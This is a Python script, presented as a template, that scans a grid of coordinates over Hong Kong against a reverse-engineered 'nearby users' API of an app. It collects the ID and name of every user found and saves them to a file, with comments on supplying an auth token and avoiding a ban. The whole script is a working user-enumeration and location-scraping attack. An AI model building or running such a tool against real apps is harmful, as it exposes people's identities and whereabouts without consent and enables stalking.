import requests
import time
import json

# ==========================================
# CONFIGURATION
# ==========================================
# You need to reverse engineer the app API to fill these in.
# This is a TEMPLATE. It will not work without real API details.

TARGET_URL = "http://api.vulnerable-app.com/get_nearby_users"
HEADERS = {
    "User-Agent": "Android/10.0 VulnerableApp/1.0",
    "Authorization": "Bearer YOUR_AUTH_TOKEN_HERE" 
}

# Hong Kong Bounding Box (Approximate)
# Top-Left: 22.56, 113.83
# Bottom-Right: 22.15, 114.40
HK_LAT_START = 22.56
HK_LAT_END = 22.15
HK_LON_START = 113.83
HK_LON_END = 114.40

# Step size (in degrees). 0.01 degrees is roughly 1.1km.
# Smaller step = more requests = higher risk of ban.
STEP_SIZE = 0.01 

def scan_grid():
    print(f"[*] Starting scan of Hong Kong area...")
    print(f"[*] Target: {TARGET_URL}")
    
    current_lat = HK_LAT_START
    users_found = {}

    while current_lat > HK_LAT_END:
        current_lon = HK_LON_START
        while current_lon < HK_LON_END:
            
            # Construct the payload based on what you found in the pcap analysis
            params = {
                "lat": current_lat,
                "lon": current_lon,
                "radius": 1000 # e.g., 1000 meters
            }
            
            try:
                print(f"[*] Probing: {current_lat:.4f}, {current_lon:.4f}")
                
                # Send the request (Change to requests.post if needed)
                response = requests.get(TARGET_URL, headers=HEADERS, params=params, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    # Parse the response to find users
                    # Assuming response structure like: {"users": [{"id": 123, "name": "Alice", "dist": 50}]}
                    if "users" in data:
                        for user in data["users"]:
                            user_id = user.get("id")
                            if user_id not in users_found:
                                users_found[user_id] = user
                                print(f"    [+] Found User: {user.get('name')} (ID: {user_id})")
                else:
                    print(f"    [!] Error: {response.status_code}")

            except Exception as e:
                print(f"    [!] Request failed: {e}")

            # Be polite to the server
            time.sleep(1) 
            
            current_lon += STEP_SIZE
        
        current_lat -= STEP_SIZE

    print(f"[*] Scan complete. Found {len(users_found)} unique users.")
    
    # Save results
    with open("scan_results.json", "w") as f:
        json.dump(users_found, f, indent=4)

if __name__ == "__main__":
    scan_grid()
